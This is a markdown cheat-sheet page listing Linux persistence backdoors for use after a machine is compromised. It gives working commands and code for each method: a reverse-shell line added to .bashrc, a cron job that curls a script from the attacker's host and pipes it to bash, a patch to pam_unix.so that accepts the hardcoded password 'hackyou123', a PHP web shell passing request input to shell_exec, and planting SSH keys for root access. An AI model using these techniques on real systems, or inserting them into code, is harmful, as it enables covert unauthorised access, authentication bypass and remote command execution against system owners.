---
title: Linux Backdoors
description: After compromising a target machine, the adversary attempts to establish persistent access. This page lists some methods of backdoors in Linux for persistence.
tags:
    - Privilege Escalation
draft: false
---

## .bashrc Backdoor

Add this line into `/root/.bashrc` or `/home/<user>/.bashrc` to gain access to target machine by reverse shell when a user logged in.

```sh
bash -i >& /dev/tcp/<local-ip>/<local-port>
```

Of course you need to always open netcat listener to be able to fetch incoming connection from the target.

```sh
nc -lvnp 4444
```

<br />

## Cron Backdoor

Add this line to the cron file like `/etc/crontab` in the target machine.

```sh
* * * * * root curl http://<local-ip>:<local-port>/shell | bash
```

Create the “shell” file in local machine.

```sh
#!/bin/bash

bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1
```

Now start local web server in local machine. Note that your current working direcotry need to be where the “shell” is located.

```sh
python3 -m http.server <local-port>
```

Once the cron job will download the “shell”,  run “bash” command to execute the “shell”.  
You should gain access to the target shell.

<br />

## pam_unix.so Backdoor

The pam_unix.so module is likely located in `/usr/lib/security` or `/usr/lib/x86_64-linux-gnu/security` directory. It automatically detects and uses shadow passwords to authenticate users.  
See this line in the pam_unix.so.

```cpp
...

/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
name = p = NULL;

...
```

Modify this line to as below.

```cpp
...

/* verify the password of this user */
if (strcmp(p, "hackyou123") != 0) {
	retval = _unix_verify_password(pamh, name, p, ctrl);
} else {
	retval = PAM_SUCCESS;
}
name = p = NULL;

AUTH_RETURN;

...
```

Whenever you login to the target system using the password “hackyou123”, you can successfully login.

<br />

## PHP Backdoor

After gaining the root access to the target, create the php file (e.g. shell.php) into `/var/www/html`.

```php
<?php 

	if (isset($_REQUEST['cmd'])) {
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	}

?>
```

Leave the php file in `/var/www/html`.  
Now you can access to the web page as below.

```bash
 http://<target-ip>/shell.php?cmd=id
```

<br />

## SSH Backdoor

After invasion to the target, you can establish the backdoor to allow you to be able to connect the target SSH server anytime.

1. Generate SSH key
    
    First off, run the following command to generate the SSH key.
    
    ```sh
    ssh-keygen
    ```
    
    It will generate two keys, private key (id_rsa) and public key (id_rsa.pub).Leave the public key in `/root/.ssh` (or `/home/<user>/.ssh`).  
    The private key need to be stored in your local machine.  
    If there is no .ssh directory, you need to create the directory as below.
    
    ```bash
    mkdir .ssh
    ```
    
    After that, you can connect the SSH when you want to connect it as long as the public key in .ssh directory is not removed.
    
2. Connect SSH Anytime You Want
    
    Before connecting, you need to modify the permission of the private key.
    
    ```bash
    chmod 600 private_key
    ```
    
    Now you can connect the SSH of the target.
    
    ```bash
    ssh root@<target-ip> -i private_key
    # or
    ssh <user>@<target-ip> -i private_key
    ```